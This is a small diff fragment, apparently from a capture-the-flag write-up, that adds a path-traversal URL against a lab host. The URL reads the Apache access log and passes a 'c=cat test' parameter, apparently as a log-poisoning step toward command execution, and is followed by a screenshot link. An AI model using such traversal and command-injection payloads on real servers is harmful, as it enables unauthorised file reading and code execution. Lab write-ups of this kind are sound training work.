@@ -555,6 +555,12 @@ params = {
 r = requests.get(url, params = params)
 ```
 
+```awk
+view-source:http://10.10.43.88/?view=dog/../../../../../../../../../var/log/apache2/access.log&ext=&c=cat%20test
+```
+
+
+<img width="1104" height="87" alt="image" src="https://github.com/user-attachments/assets/de4a279e-d4f8-437d-ae9c-81e79cb19fbe" />
 
 
 
